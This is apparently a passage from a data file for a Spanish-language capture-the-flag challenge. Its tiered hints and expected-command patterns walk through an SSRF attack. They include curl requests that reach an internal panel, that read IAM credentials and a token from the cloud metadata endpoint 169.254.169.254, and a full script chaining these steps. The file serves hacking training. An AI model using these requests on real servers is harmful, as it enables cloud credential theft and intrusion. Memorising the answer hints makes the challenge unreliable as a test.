            text: "Si el panel devuelve HTML, navega por sus rutas: /internal/, /internal/status, /internal/classified. Usa el SSRF como proxy para cada petición.",
          },
          {
            level: 3,
            text: "curl -X POST http://target/api/fetch-preview -d 'url=http://192.168.1.100:8080/internal/classified' — la respuesta del panel interno se incluirá en la respuesta del servidor público.",
          },
        ],
      },
      {
        name: "Extracción de la flag",
        description:
          "Accede al endpoint /internal/classified del panel interno a través del SSRF y extrae la flag.",
        expectedCommands: [
          "/internal/classified",
          "HACKQUEST\\{",
          "classified.*flag",
          "192.*classified",
          "ssrf.*classified",
        ],
        hints: [
          {
            level: 1,
            text: "El endpoint de la flag está en el panel interno: http://192.168.1.100:8080/internal/classified",
          },
          {
            level: 2,
            text: "Puede que el panel interno requiera la cabecera X-Internal-Token. Su valor está en los metadatos: http://169.254.169.254/latest/user-data",
          },
          {
            level: 3,
            text: "Encadena las peticiones: primero obtén el token desde /user-data, luego usa url=http://192.168.1.100:8080/internal/classified con el token como cabecera X-Internal-Token.",
          },
        ],
      },
    ],

    hints: [
      {
        level: 1,
        cost: 35,
        text: "El parámetro vulnerable es: POST /api/fetch-preview con body url=http://... El servidor realiza la petición HTTP y devuelve el contenido. Prueba con url=http://169.254.169.254/latest/meta-data/",
      },
      {
        level: 2,
        cost: 70,
        text: "Secuencia completa de IMDS: (1) url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ → nombre del rol. (2) url=http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROL] → credenciales. (3) url=http://192.168.1.100:8080/internal/classified → flag.",
      },
      {
        level: 3,
        cost: 122,
        text: "Script completo: ROL=$(curl -s -X POST http://target/api/fetch-preview -d 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/' | jq -r '.content') && curl -s -X POST http://target/api/fetch-preview -d \"url=http://192.168.1.100:8080/internal/classified\" | grep -o 'HACKQUEST{[^}]*}'",
      },
    ],
  },
];
